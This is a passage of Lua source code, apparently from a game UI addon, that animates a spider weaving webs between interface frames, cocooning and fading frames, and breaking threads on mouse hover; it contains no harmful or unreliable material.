            p2 = { x = p2.x, y = p2.y },
        }
    end

    drawThread.ownerRef = thread.ownerRef

    return drawThread, reverse
end

function NSPauk:AddMainThreadTasks(inst, tasks, cursorPoint)
    if not inst or not inst.conns or #inst.conns == 0 then
        return cursorPoint
    end

    local pending = {}

    for i, conn in ipairs(inst.conns) do
        pending[i] = conn
    end

    while #pending > 0 do
        local bestIndex = nil
        local bestDraw = nil
        local bestScore = math.huge

        for i, conn in ipairs(pending) do
            local drawThread = self:MakeTopDownDrawThread(conn.thread, cursorPoint)

            if drawThread then
                local score

                if cursorPoint then
                    local dx = drawThread.p0.x - cursorPoint.x
                    local dy = drawThread.p0.y - cursorPoint.y
                    score = dx * dx + dy * dy
                else
                    score = -drawThread.p0.y
                end

                if score < bestScore then
                    bestScore = score
                    bestIndex = i
                    bestDraw = drawThread
                end
            end
        end

        if not bestIndex or not bestDraw then
            break
        end

        local conn = pending[bestIndex]
        table.remove(pending, bestIndex)

        if cursorPoint then
            self:AddTravelPointTask(tasks, cursorPoint, bestDraw.p0, conn, conn)
        end

        local task = self:AddThreadTask(tasks, conn, bestDraw)
        task.isMain = true

        cursorPoint = {
            x = bestDraw.p2.x,
            y = bestDraw.p2.y,
        }
    end

    return cursorPoint
end

function NSPauk:BuildInstanceTasks(inst)
    local S = self.S
    local C = self.C

    local tasks = {}

    inst.crossRowsList = {}

    if not inst.interSegs then
        inst.interSegs = {}
    end

    local cursorPoint = nil

    if S.spider and S.spider:IsShown() then
        cursorPoint = { x = S.lastSpiderX, y = S.lastSpiderY }
    end

    cursorPoint = self:AddMainThreadTasks(inst, tasks, cursorPoint)

    local N = #inst.conns

    if N >= 2 then
        for _, conn in ipairs(inst.conns) do
            local samples, total = self:BuildArcSamples(conn.thread)
            conn.arcSamples = samples
            conn.arcLength = total
        end

        local sectorAllowed, sectorAngleDeg = self:ComputeCrossSectors(inst)
        inst.sectorAllowed = sectorAllowed
        inst.sectorAngleDeg = sectorAngleDeg

        local spacing = C.CROSS_ROW_SPACING

        if not spacing or spacing < 0.5 then
            spacing = 0.5
        end

        local pairMinLens = {}
        local maxPairLen = 0
        local hasAllowed = false

        for i = 1, N do
            local j = (i % N) + 1

            local lenA = inst.conns[i].arcLength or 0
            local lenB = inst.conns[j].arcLength or 0
            local pairMin = math.min(lenA, lenB)

            if sectorAllowed[i] then
                pairMinLens[i] = pairMin
                hasAllowed = true

                if pairMin > maxPairLen then
                    maxPairLen = pairMin
                end
            else
                pairMinLens[i] = 0
            end
        end

        if hasAllowed then
            local distances = {}
            local seen = {}

            local function addDistance(d)
                if type(d) ~= "number" or d < C.MIN_CROSS_LEN then
                    return
                end

                if d > maxPairLen then
                    d = maxPairLen
                end

                local key = math.floor(d + 0.5)

                if not seen[key] then
                    seen[key] = true
                    distances[#distances + 1] = d
                end
            end

            local maxRows = C.MAX_CROSS_ROWS or 0

            if maxRows < 0 then
                maxRows = 0
            end

            local rows = math.floor(maxPairLen / spacing + 0.0001)

            if rows > maxRows then
                rows = maxRows
            end

            for row = 1, rows do
                addDistance(row * spacing)
            end

            for i = 1, N do
                if sectorAllowed[i] then
                    addDistance(pairMinLens[i])
                end
            end

            table.sort(distances)

            if #distances > maxRows then
                for i = #distances, maxRows + 1, -1 do
                    distances[i] = nil
                end
            end

            inst.crossRows = #distances

            if #distances > 0 then
                local px, py = self:BzThread(inst.conns[1].thread, 0)

                if cursorPoint then
                    self:AddTravelPointTask(
                        tasks,
                        cursorPoint,
                        { x = px, y = py },
                        inst.conns[1],
                        inst.conns[1]
                    )
                end

                local cursor = {
                    idx = 1,
                    t = 0,
                    point = { x = px, y = py },
                }

                for idx, arcLen in ipairs(distances) do
                    self:AddArcRowTasks(tasks, inst, cursor, arcLen, idx)
                end

                if cursor.t and cursor.t > 0.001 and cursor.idx >= 1 and cursor.idx <= N then
                    self:AddTravelThreadTask(
                        tasks,
                        inst.conns[cursor.idx],
                        cursor.t,
                        0,
                        inst.conns[cursor.idx]
                    )
                end

                self:AddInterCrossTasks(tasks, inst, { point = { x = px, y = py } })
            end
        else
            inst.crossRows = 0
        end
    else
        inst.crossRows = 0
    end

    inst.tasks = tasks
end

function NSPauk:CreateInstance(hub, candidates, targetCount)
    local inst = {
        id = self.nextInstanceId,
        hub = {
            frame = hub.frame,
            name = hub.name,
            rect = self:CopyRect(hub),
        },
        conns = {},
        crossSegs = {},
        interSegs = {},
        crossRowsList = {},
        tasks = {},
        crossRows = 0,
        anchorCandidates = {},
        drawnPoints = 0,
        settled = false,
    }

    self.nextInstanceId = self.nextInstanceId + 1

    local seenAnchors = {}

    local function addAnchor(rect)
        local key = (rect.frame and tostring(rect.frame)) or rect.name

        if not key then
            key = tostring(rect.left) .. ":" .. tostring(rect.top)
        end

        if not seenAnchors[key] then
            seenAnchors[key] = true
            inst.anchorCandidates[#inst.anchorCandidates + 1] = rect
        end
    end

    addAnchor(inst.hub.rect)

    local acceptedThreads = {}

    local minDist = tonumber(self.C.WEB_THREAD_MIN_SEPARATION)

    if type(minDist) ~= "number" or minDist ~= minDist or minDist < 0 then
        minDist = 20
    end

    local ignoreHub = tonumber(self.C.WEB_HUB_IGNORE_DIST)

    if type(ignoreHub) ~= "number" or ignoreHub ~= ignoreHub or ignoreHub < 0 then
        ignoreHub = 100
    end

    local maxAttempts = tonumber(self.C.WEB_TARGET_REROLL_ATTEMPTS)

    if type(maxAttempts) ~= "number" or maxAttempts ~= maxAttempts or maxAttempts < 1 then
        maxAttempts = 8
    end

    local made = 0

    if candidates and #candidates > 0 and targetCount and targetCount > 0 then
        local totalAttempts = 0
        local maxTotalAttempts = targetCount * maxAttempts * 4

        while made < targetCount and totalAttempts < maxTotalAttempts do
            totalAttempts = totalAttempts + 1

            local cand = candidates[math.random(1, #candidates)]
            local target = cand and cand.item

            if target and target ~= hub and target.frame ~= hub.frame then
                for _ = 1, 3 do
                    local thread = self:MakeRadialThread(inst.hub.rect, target, 1, 1)

                    if not thread then
                        break
                    end

                    local conflict = false

                    for _, otherThread in ipairs(acceptedThreads) do
                        if self:ThreadsTooClose(thread, otherThread, minDist, ignoreHub) then
                            conflict = true
                            break
                        end
                    end

                    if not conflict then
                        local conn = {
                            id = #inst.conns + 1,
                            target = {
                                frame = target.frame,
                                name = target.name,
                                rect = self:CopyRect(target),
                            },
                            thread = thread,
                            angle = thread.angle,
                            textures = {},
                            alive = true,
                            arcSamples = nil,
                            arcLength = 0,
                        }

                        thread.ownerRef = {
                            inst = inst,
                            conn = conn,
                        }

                        inst.conns[#inst.conns + 1] = conn
                        acceptedThreads[#acceptedThreads + 1] = thread

                        made = made + 1

                        addAnchor(self:CopyRect(target))

                        break
                    end
                end
            end
        end
    end

    if #inst.conns == 0 then
        return nil
    end

    table.sort(inst.conns, function(a, b)
        return a.angle < b.angle
    end)

    for i, conn in ipairs(inst.conns) do
        conn.id = i
    end

    self:BuildInstanceTasks(inst)

    return inst
end

function NSPauk:PickCocoonVictim(items)
    local minWidth = tonumber(self.C.COCOON_MIN_WIDTH) or 30
    local cand = {}

    for _, item in ipairs(items or {}) do
        if item.frame and self:IsGoodAnchorName(item.name) and (item.width or 0) > minWidth then
            cand[#cand + 1] = item
        end
    end

    if #cand == 0 then
        return nil
    end

    return cand[self:RandomInt(1, #cand)]
end

function NSPauk:EllipsePoint(cx, cy, a, b, ang)
    return cx + a * math.cos(ang), cy + b * math.sin(ang)
end

function NSPauk:AddCocoonConn(inst, item, thread)
    local conn = {
        id = #inst.conns + 1,
        target = {
            frame = item.frame,
            name = item.name,
            rect = self:CopyRect(item),
        },
        thread = thread,
        angle = math.atan2(thread.p0.y - item.cy, thread.p0.x - item.cx),
        textures = {},
        alive = true,
    }

    thread.ownerRef = {
        inst = inst,
        conn = conn,
    }

    inst.conns[#inst.conns + 1] = conn

    return conn
end

function NSPauk:CreateCocoonInstance(item)
    local C = self.C

    local inst = {
        id = self.nextInstanceId,
        isCocoon = true,
        hub = {
            frame = item.frame,
            name = item.name,
            rect = self:CopyRect(item),
        },
        conns = {},
        crossSegs = {},
        interSegs = {},
        crossRowsList = {},
        tasks = {},
        crossRows = 0,
        anchorCandidates = { self:CopyRect(item) },
        drawnPoints = 0,
        settled = false,
    }

    self.nextInstanceId = self.nextInstanceId + 1

    local cx = item.cx
    local cy = item.cy
    local a0 = item.width / 2
    local b0 = item.height / 2

    local wraps = self:RandomInt(C.COCOON_WRAPS_MIN, C.COCOON_WRAPS_MAX)
    local segs = C.COCOON_LOOP_SEGS
    local prevEnd = nil

    for w = 1, wraps do
        local grow = 0.58 + 0.50 * (w / wraps)

        local a = a0 * grow + (math.random() - 0.5) * 6
        local b = b0 * grow + (math.random() - 0.5) * 6

        if a < 9 then
            a = 9
        end

        if b < 9 then
            b = 9
        end

        local startAng = math.random() * 2 * math.pi
        local dir = (math.random() < 0.5) and 1 or -1

        for s = 1, segs do
            local ang0 = startAng + dir * (s - 1) * (2 * math.pi / segs)
            local ang1 = startAng + dir * s * (2 * math.pi / segs)

            local x0, y0 = self:EllipsePoint(cx, cy, a, b, ang0)
            local x1, y1 = self:EllipsePoint(cx, cy, a, b, ang1)

            x0 = x0 + (math.random() - 0.5) * 5
            y0 = y0 + (math.random() - 0.5) * 5
            x1 = x1 + (math.random() - 0.5) * 5
            y1 = y1 + (math.random() - 0.5) * 5

            local midX = (x0 + x1) / 2
            local midY = (y0 + y1) / 2

            local pushX = midX - cx
            local pushY = midY - cy
            local pl = math.sqrt(pushX * pushX + pushY * pushY)

            if pl < 1 then
                pushX, pushY, pl = 0, 1, 1
            end

            local push = pl * (0.22 + math.random() * 0.22)

            local thread = {
                p0 = { x = x0, y = y0 },
                p1 = {
                    x = midX + (pushX / pl) * push,
                    y = midY + (pushY / pl) * push,
                },
                p2 = { x = x1, y = y1 },
            }

            local conn = self:AddCocoonConn(inst, item, thread)

            if prevEnd then
                self:AddTravelPointTask(inst.tasks, prevEnd, thread.p0, conn, conn)
            end

            self:AddThreadTask(inst.tasks, conn, thread)

            prevEnd = { x = thread.p2.x, y = thread.p2.y }
        end
    end

    local diags = self:RandomInt(C.COCOON_DIAG_MIN, C.COCOON_DIAG_MAX)

    for _ = 1, diags do
        local angA = math.random() * 2 * math.pi
        local angB = angA + math.pi + (math.random() - 0.5) * 1.1

        local x0, y0 = self:EllipsePoint(cx, cy, a0 * 1.06, b0 * 1.06, angA)
        local x1, y1 = self:EllipsePoint(cx, cy, a0 * 1.06, b0 * 1.06, angB)

        local thread = {
            p0 = { x = x0, y = y0 },
            p2 = { x = x1, y = y1 },
        }

        self:MakeSag(thread, "main")

        local conn = self:AddCocoonConn(inst, item, thread)

        if prevEnd then
            self:AddTravelPointTask(inst.tasks, prevEnd, thread.p0, conn, conn)
        end

        self:AddThreadTask(inst.tasks, conn, thread)

        prevEnd = { x = thread.p2.x, y = thread.p2.y }
    end

    if #inst.conns == 0 then
        return nil
    end

    return inst
end

function NSPauk:StartCocoon(victim)
    local S = self.S
    local C = self.C

    local inst = self:CreateCocoonInstance(victim)

    if not inst then
        if S.limitCocoonPending then
            S.limitCocoonPending = false
            S.phase = "limitWait"

            local interval = tonumber(C.LIMIT_COCOON_INTERVAL) or 1800
            local retry = tonumber(C.LIMIT_COCOON_RETRY) or 60

            S.limitWaitTimer = math.max(0, interval - retry)
        else
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    self:AddInstance(inst)

    S.currentInstance = inst
    S.tasks = inst.tasks
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    self:MkSpider()
    self:MkClickBtn()
    self:AdvanceTask()
end

function NSPauk:BeginDissolve(inst)
    local S = self.S
    local C = self.C

    if not inst then
        if S.limitReached or S.limitCocoonPending then
            S.limitCocoonPending = false
            self:ReturnToLimitHome()
        else
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    local frame = inst.hub.frame
    local aliveCount = 0

    for _, conn in ipairs(inst.conns) do
        if conn.alive then
            aliveCount = aliveCount + 1
        end
    end

    if not frame or not frame.SetAlpha or not frame.GetAlpha or aliveCount == 0 then
        self:TearInstance(inst)

        if S.limitReached or S.limitCocoonPending then
            S.limitCocoonPending = false
            self:ReturnToLimitHome()
        else
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    local baseAlpha = frame:GetAlpha() or 1

    S.cocoon = {
        inst = inst,
        frame = frame,
        baseAlpha = baseAlpha,
        minAlpha = math.min(C.MIN_COCOON_ALPHA, baseAlpha),
        duration = self:RandomFloat(C.DISSOLVE_DURATION_MIN, C.DISSOLVE_DURATION_MAX),
        timer = 0,
        digested = false,
    }

    S.phase = "dissolve"
    S.speedTimer = 0
end

function NSPauk:SetInstanceWebAlpha(inst, alpha)
    if not inst then
        return
    end

    if alpha < 0 then
        alpha = 0
    end

    for _, conn in ipairs(inst.conns) do
        for _, texture in ipairs(conn.textures) do
            texture:SetAlpha(alpha)
        end
    end

    for _, seg in ipairs(inst.crossSegs) do
        for _, texture in ipairs(seg.textures) do
            texture:SetAlpha(alpha)
        end
    end
end

function NSPauk:SafeHideFrame(f)
    if not f then
        return
    end

    local canHide = true

    if f.IsProtected and f:IsProtected() then
        canHide = false
    end

    if canHide and f.Hide then
        f:Hide()
    end

    if f.SetAlpha then
        f:SetAlpha(0)
    end
end

function NSPauk:SafeShowFrame(f, alpha)
    if not f then
        return
    end

    if f.Show then
        f:Show()
    end

    if f.SetAlpha then
        f:SetAlpha(alpha or 1)
    end
end

function NSPauk:AddDigestedFrame(frame, baseAlpha)
    if not frame then
        return
    end

    local S = self.S

    if not S.digestedFrames then
        S.digestedFrames = {}
    end

    for _, info in ipairs(S.digestedFrames) do
        if info.frame == frame then
            info.baseAlpha = baseAlpha or info.baseAlpha or 1
            return
        end
    end

    table.insert(S.digestedFrames, { frame = frame, baseAlpha = baseAlpha or 1 })
end

function NSPauk:RestoreDigestedFrames()
    local S = self.S

    if not S.digestedFrames then
        S.digestedFrames = {}
    end

    for i = #S.digestedFrames, 1, -1 do
        local info = S.digestedFrames[i]

        if info and info.frame then
            self:SafeShowFrame(info.frame, info.baseAlpha or 1)
        end

        table.remove(S.digestedFrames, i)
    end
end

function NSPauk:RemoveInstance(inst)
    local S = self.S

    if not inst then
        return
    end

    for i, v in ipairs(S.instances) do
        if v == inst then
            table.remove(S.instances, i)
            break
        end
    end

    if S.currentInstance == inst then
        S.currentInstance = nil
    end
end

function NSPauk:HideInstanceTextures(inst)
    if not inst then
        return
    end

    for _, conn in ipairs(inst.conns) do
        self:RecycleTextures(conn.textures)
        conn.alive = false
    end

    for _, seg in ipairs(inst.crossSegs) do
        self:RecycleTextures(seg.textures)
        seg.alive = false
    end
end

function NSPauk:BreakAnchoredToFrame(frame)
    if not frame then
        return
    end

    local S = self.S

    for _, inst in ipairs(S.instances) do
        if inst.hub.frame == frame then
            self:TearInstance(inst)
        else
            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.target.frame == frame then
                    self:KillConnection(inst, conn)
                end
            end
        end
    end
end

function NSPauk:FinishCocoonDigestion()
    local S = self.S
    local c = S.cocoon

    if not c then
        if S.limitReached or S.limitCocoonPending then
            self:ReturnToLimitHome()
        else
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    local victimName

    if c.inst and c.inst.hub and type(c.inst.hub.name) == "string" and c.inst.hub.name ~= "" then
        victimName = c.inst.hub.name
    elseif c.frame and c.frame.GetName then
        victimName = c.frame:GetName()
    end

    if c.inst then
        self:SettleInstance(c.inst)
    end

    self:AwardCocoonExperience(victimName)

    if c.frame then
        self:SafeHideFrame(c.frame)
        self:AddDigestedFrame(c.frame, c.baseAlpha or 1)
    end

    if c.inst then
        self:HideInstanceTextures(c.inst)
        self:RemoveInstance(c.inst)
    end

    self:BreakAnchoredToFrame(c.frame)

    S.cocoon = nil
    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    if S.limitReached or S.limitCocoonPending then
        self:ReturnToLimitHome()
    else
        self:StartNewInstance(nil)
    end
end

function NSPauk:AbortCocoon()
    local S = self.S
    local c = S.cocoon

    if not c then
        if S.limitCocoonPending then
            S.limitCocoonPending = false

            if S.limitReached and S.phase ~= "fade" and not S.limitReturnPending then
                self:ReturnToLimitHome()
            end
        end

        return
    end

    if c.frame then
        self:SafeShowFrame(c.frame, c.baseAlpha or 1)
    end

    if c.inst then
        self:TearInstance(c.inst)
    end

    S.cocoon = nil

    if S.limitCocoonPending then
        S.limitCocoonPending = false

        if S.limitReached and S.phase ~= "fade" and not S.limitReturnPending then
            self:ReturnToLimitHome()
        end
    end
end

function NSPauk:RecycleTextures(list)
    if not list then
        return
    end

    local S = self.S

    for _, texture in ipairs(list) do
        if texture then
            if texture._nspAlive then
                texture._nspAlive = false
                S.webAliveCount = math.max(0, (S.webAliveCount or 0) - 1)
            end

            texture:Hide()

            if not texture._nspInPool then
                texture._nspInPool = true
                table.insert(S.webPool, texture)
            end
        end
    end

    for i = #list, 1, -1 do
        list[i] = nil
    end
end

function NSPauk:AddFade(textures, duration, onComplete)
    if not duration or duration <= 0 then
        duration = 0.1
    end

    if not textures or #textures == 0 then
        if onComplete then
            onComplete(self)
        end

        return
    end

    local fade = {
        timer = 0,
        duration = duration,
        textures = textures,
        baseAlphas = {},
        onComplete = onComplete,
    }

    for i, texture in ipairs(textures) do
        fade.baseAlphas[i] = texture.GetAlpha and texture:GetAlpha() or 1
    end

    table.insert(self.S.fades, fade)
end

function NSPauk:UpdateFades(dt)
    local S = self.S

    for i = #S.fades, 1, -1 do
        local fade = S.fades[i]

        fade.timer = fade.timer + dt

        local alpha = 1 - (fade.timer / fade.duration)

        if alpha <= 0 then
            self:RecycleTextures(fade.textures)
            table.remove(S.fades, i)

            if fade.onComplete then
                fade.onComplete(self)
            end
        else
            for j, texture in ipairs(fade.textures) do
                if texture:IsShown() then
                    texture:SetAlpha(alpha * (fade.baseAlphas[j] or 1))
                end
            end
        end
    end
end

function NSPauk:StartLocalFade(textures, duration)
    self:AddFade(textures, duration, nil)
end

function NSPauk:KillSeg(seg)
    if not seg or not seg.alive then
        return
    end

    seg.alive = false

    if #seg.textures > 0 then
        self:StartLocalFade(seg.textures, self.C.TEAR_FADE_DURATION)
        seg.textures = {}
    end

    local ref = seg.thread and seg.thread.ownerRef
    local inst = ref and ref.inst

    if inst and inst.interSegs then
        for _, inter in ipairs(inst.interSegs) do
            if inter.alive and (inter.parentSegA == seg or inter.parentSegB == seg) then
                self:KillSeg(inter)
            end
        end
    end
end

function NSPauk:KillConnection(inst, conn)
    if not conn or not conn.alive then
        return
    end

    conn.alive = false

    if #conn.textures > 0 then
        self:StartLocalFade(conn.textures, self.C.TEAR_FADE_DURATION)
        conn.textures = {}
    end

    if inst then
        for _, seg in ipairs(inst.crossSegs) do
            if seg.alive and (seg.connA == conn or seg.connB == conn) then
                self:KillSeg(seg)
            end
        end

        self:CheckInstanceDead(inst)
    end
end

function NSPauk:TearInstance(inst)
    if not inst or inst.torn then
        return
    end

    inst.torn = true

    self:SettleInstance(inst)

    for _, conn in ipairs(inst.conns) do
        self:KillConnection(inst, conn)
    end
end

function NSPauk:CheckInstancesMovement()
    local S = self.S
    local killed = false

    for _, inst in ipairs(S.instances) do
        if not inst.torn then
            local hubMoved = false

            if inst.hub.frame then
                hubMoved = self:FrameMoved(inst.hub.rect, inst.hub.frame)
            end

            if hubMoved then
                if inst.isCocoon and S.cocoon and S.cocoon.inst == inst then
                    self:AbortCocoon()

                    if S.phase ~= "limitWait" and not S.limitReturnPending then
                        if S.limitReached then
                            self:ReturnToLimitHome()
                        else
                            S.phase = "watch"
                            S.stillTimer = 0
                            S.speedTimer = 0
                        end
                    end
                else
                    self:TearInstance(inst)
                end

                killed = true
            else
                for _, conn in ipairs(inst.conns) do
                    if conn.alive and conn.target.frame then
                        if self:FrameMoved(conn.target.rect, conn.target.frame) then
                            self:KillConnection(inst, conn)
                            killed = true
                        end
                    end
                end
            end
        end
    end

    self:RemoveTornInstances()

    return killed
end

function NSPauk:ThreadNearMouse(thread, mx, my, pad)
    local p0 = thread.p0
    local p2 = thread.p2

    if not p0 or not p2 then
        return false
    end

    local p1 = thread.p1

    local minX = p0.x
    local maxX = p0.x
    local minY = p0.y
    local maxY = p0.y

    if p1 then
        if p1.x < minX then
            minX = p1.x
        end

        if p1.x > maxX then
            maxX = p1.x
        end

        if p1.y < minY then
            minY = p1.y
        end

        if p1.y > maxY then
            maxY = p1.y
        end
    end

    if p2.x < minX then
        minX = p2.x
    end

    if p2.x > maxX then
        maxX = p2.x
    end

    if p2.y < minY then
        minY = p2.y
    end

    if p2.y > maxY then
        maxY = p2.y
    end

    return mx >= minX - pad
        and mx <= maxX + pad
        and my >= minY - pad
        and my <= maxY + pad
end

function NSPauk:DistToThread(thread, mx, my)
    local p0 = thread.p0
    local p2 = thread.p2

    if not p0 or not p2 then
        return math.huge
    end

    local p1 = thread.p1 or {
        x = (p0.x + p2.x) / 2,
        y = (p0.y + p2.y) / 2,
    }

    local best = math.huge
    local prevX, prevY

    for i = 0, 16 do
        local t = i / 16
        local x = self:Bz(t, p0.x, p1.x, p2.x)
        local y = self:Bz(t, p0.y, p1.y, p2.y)

        if i == 0 then
            local dx = x - mx
            local dy = y - my
            best = dx * dx + dy * dy
        else
            local d2 = self:PointSegDist2(mx, my, prevX, prevY, x, y)

            if d2 < best then
                best = d2
            end
        end

        prevX, prevY = x, y
    end

    return math.sqrt(best)
end

function NSPauk:FindThreadUnderMouse(mx, my)
    local S = self.S
    local C = self.C

    local bestThread = nil
    local bestDist = C.MOUSE_THREAD_DIST

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            if conn.alive and conn.thread then
                if self:ThreadNearMouse(conn.thread, mx, my, C.MOUSE_THREAD_DIST) then
                    local d = self:DistToThread(conn.thread, mx, my)

                    if d <= bestDist then
                        bestDist = d
                        bestThread = conn.thread
                    end
                end
            end
        end

        for _, seg in ipairs(inst.crossSegs) do
            if seg.alive and seg.thread then
                if self:ThreadNearMouse(seg.thread, mx, my, C.MOUSE_THREAD_DIST) then
                    local d = self:DistToThread(seg.thread, mx, my)

                    if d <= bestDist then
                        bestDist = d
                        bestThread = seg.thread
                    end
                end
            end
        end
    end

    return bestThread
end

function NSPauk:BreakThread(thread)
    local ref = thread.ownerRef

    if not ref or not ref.inst then
        return
    end

    if ref.seg then
        self:KillSeg(ref.seg)
    elseif ref.conn then
        self:KillConnection(ref.inst, ref.conn)
    end

    thread.hoverCount = 0
end

function NSPauk:ResetHoverCounts()
    local S = self.S

    for _, inst in ipairs(S.instances) do
        for _, conn in ipairs(inst.conns) do
            if conn.thread then
                conn.thread.hoverCount = 0
            end
        end

        for _, seg in ipairs(inst.crossSegs) do
            if seg.thread then
                seg.thread.hoverCount = 0
            end
        end
    end
end

function NSPauk:CheckMouseThreads(dt)
    local S = self.S
    local C = self.C

    S.mouseTimer = S.mouseTimer + dt

    if S.mouseTimer < C.MOUSE_CHECK then
        return
    end

    S.mouseTimer = 0

    if #S.instances == 0 then
        S.mouseOnThread = nil
        S.mouseIdle = 0
        return
    end

    if not GetCursorPosition then
        return
    end

    local scale = self:EffScale(UIParent)
    local mx, my = GetCursorPosition()

    mx = mx / scale
    my = my / scale

    local hit = self:FindThreadUnderMouse(mx, my)

    if hit then
        S.mouseIdle = 0

        if S.mouseOnThread ~= hit then
            S.mouseOnThread = hit
            hit.hoverCount = (hit.hoverCount or 0) + 1

            if hit.hoverCount > C.MOUSE_HOVER_LIMIT then
                self:BreakThread(hit)
                S.mouseOnThread = nil
            end
        end
    else
        S.mouseOnThread = nil
        S.mouseIdle = S.mouseIdle + C.MOUSE_CHECK

        if S.mouseIdle >= C.MOUSE_STREAK_RESET then
            self:ResetHoverCounts()
            S.mouseIdle = 0
        end
    end
end

function NSPauk:MkSpider()
    local S = self.S
    local C = self.C

    local parent = S.spiderFrame or S.activeFrame
    local spider = S.spider

    if spider and spider:GetParent() ~= parent then
        spider:Hide()
        S.spider = nil
        spider = nil
    end

    if not spider then
        spider = parent:CreateTexture(nil, "OVERLAY")
        S.spider = spider
    end

    spider:SetTexture(C.TEX_SPIDER)
    spider:SetWidth(C.SPIDER_SIZE)
    spider:SetHeight(C.SPIDER_SIZE)
    spider:SetDrawLayer("OVERLAY")
    spider:Show()
end

function NSPauk:PutSpider(x, y)
    local S = self.S

    S.lastSpiderX = x
    S.lastSpiderY = y

    if S.spider then
        S.spider:ClearAllPoints()
        S.spider:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)
    end

    if S.clickBtn then
        S.clickBtn:ClearAllPoints()
        S.clickBtn:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)
    end
end

function NSPauk:HideSpider()
    local S = self.S

    if S.spider then
        S.spider:Hide()
    end

    if S.clickBtn then
        S.clickBtn:Hide()
    end
end

function NSPauk:DropWebForTask(task, x, y)
    local S = self.S
    local C = self.C

    local owner = task.owner

    if not owner or not owner.alive then
        return
    end

    local maxSegs = tonumber(C.MAX_WEB_SEGS) or 0

    if maxSegs > 0 and (S.webAliveCount or 0) >= maxSegs then
        return
    end

    local texture

    if #S.webPool > 0 then
        texture = table.remove(S.webPool)

        if texture then
            texture._nspInPool = false
        end
    elseif maxSegs <= 0 or (S.webAliveCount or 0) < maxSegs then
        texture = S.activeFrame:CreateTexture(nil, "OVERLAY")
        S.webCreated = S.webCreated + 1
    else
        return
    end

    if not texture then
        return
    end

    texture:SetTexture(C.TEX_WEB)
    texture:SetWidth(C.WEB_SIZE)
    texture:SetHeight(C.WEB_SIZE)
    texture:SetVertexColor(1, 1, 1, 1)
    texture:SetAlpha(C.WEB_ALPHA)
    texture:SetDrawLayer("OVERLAY")
    texture:ClearAllPoints()
    texture:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)
    texture:Show()

    owner.textures[#owner.textures + 1] = texture

    if not texture._nspAlive then
        texture._nspAlive = true
        S.webAliveCount = (S.webAliveCount or 0) + 1
    end

    local inst = self:GetOwnerInstance(owner)

    if inst then
        inst.drawnPoints = (inst.drawnPoints or 0) + 1
    end

    S.webPoints = S.webPoints + 1
end

function NSPauk:DropAlongLine(task, fx, fy, tx, ty)
    local S = self.S
    local C = self.C

    local spacing = C.WEB_POINT_SPACING_MAX

    if spacing <= 0 then
        spacing = 1
    end

    local dx = tx - fx
    local dy = ty - fy
    local len = math.sqrt(dx * dx + dy * dy)

    if len < spacing then
        return
    end

    local steps = math.floor(len / spacing)

    if steps > C.MAX_DROPS_PER_FRAME then
        steps = C.MAX_DROPS_PER_FRAME
    end

    local ux = dx / len
    local uy = dy / len

    for i = 1, steps do
        self:DropWebForTask(task, fx + ux * spacing * i, fy + uy * spacing * i)
    end

    S.lastDropX = fx + ux * spacing * steps
    S.lastDropY = fy + uy * spacing * steps
end

function NSPauk:DropAlongCurve(task, t0, t1)
    local S = self.S
    local C = self.C

    if not task or not task.drop then
        return
    end

    if not t0 or not t1 or t1 <= t0 then
        return
    end

    local spacing = self:GetWebPointSpacing()
    task.dropSpacing = spacing

    local totalLen = task.pathLength

    if type(totalLen) ~= "number" or totalLen <= 0 then
        totalLen = self:ApproxThreadLength(task)
        task.pathLength = totalLen
    end

    if totalLen <= 0 then
        return
    end

    local segLen = totalLen * (t1 - t0)

    if segLen <= 0 then
        return
    end

    if type(task.dropRemainder) ~= "number" or task.dropRemainder < 0 then
        task.dropRemainder = 0
    end

    local total = task.dropRemainder + segLen

    if total < spacing then
        task.dropRemainder = total

        local lx, ly = self:BzThread(task, t1)
        S.lastDropX = lx
        S.lastDropY = ly

        return
    end

    local planned = math.floor(total / spacing)

    if planned < 1 then
        planned = 1
    end

    local maxDrops = tonumber(C.MAX_DROPS_PER_FRAME) or 0
    local hard = math.max(maxDrops, 500)
    local span = t1 - t0
    local lastX, lastY

    if planned > hard then
        for i = 1, hard do
            local f = i / hard
            local t = t0 + span * f
            local x, y = self:BzThread(task, t)

            self:DropWebForTask(task, x, y)

            lastX, lastY = x, y
        end

        task.dropRemainder = 0
    else
        for i = 1, planned do
            local distFromStart = i * spacing - task.dropRemainder

            if distFromStart < 0 then
                distFromStart = 0
            end

            if distFromStart > segLen then
                distFromStart = segLen
            end

            local f = 0

            if segLen > 0 then
                f = distFromStart / segLen
            end

            local t = t0 + span * f
            local x, y = self:BzThread(task, t)

            self:DropWebForTask(task, x, y)

            lastX, lastY = x, y
        end

        task.dropRemainder = total - planned * spacing

        if task.dropRemainder < 0 then
            task.dropRemainder = 0
        end
    end

    if lastX then
        S.lastDropX = lastX
        S.lastDropY = lastY
    else
        local lx, ly = self:BzThread(task, t1)
        S.lastDropX = lx
        S.lastDropY = ly
    end
end

function NSPauk:FinishClickFade()
    local S = self.S

    S.webAliveCount = 0
    S.phase = "disabled"
    S.disableTimer = 0
end

function NSPauk:MkClickBtn()
    local S = self.S
    local C = self.C

    local parent = S.clickFrame or S.spiderFrame or S.activeFrame
    local btn = S.clickBtn

    if btn and btn:GetParent() ~= parent then
        btn:Hide()
        S.clickBtn = nil
        btn = nil
    end

    if not btn then
        btn = CreateFrame("Button", nil, parent)
        btn:EnableMouse(true)
        btn:RegisterForClicks("LeftButtonUp", "RightButtonUp")
        btn:SetScript("OnClick", function(_, button)
            NSPauk:OnSpiderClick(button)
        end)

        S.clickBtn = btn
    end

    btn:SetWidth(C.SPIDER_SIZE)
    btn:SetHeight(C.SPIDER_SIZE)
    btn:SetFrameLevel(parent:GetFrameLevel() + 1)
    btn:Show()
end

function NSPauk:IsMoving()
    local C = self.C
    local speed = GetUnitSpeed and GetUnitSpeed("player") or nil

    if not speed then
        return false
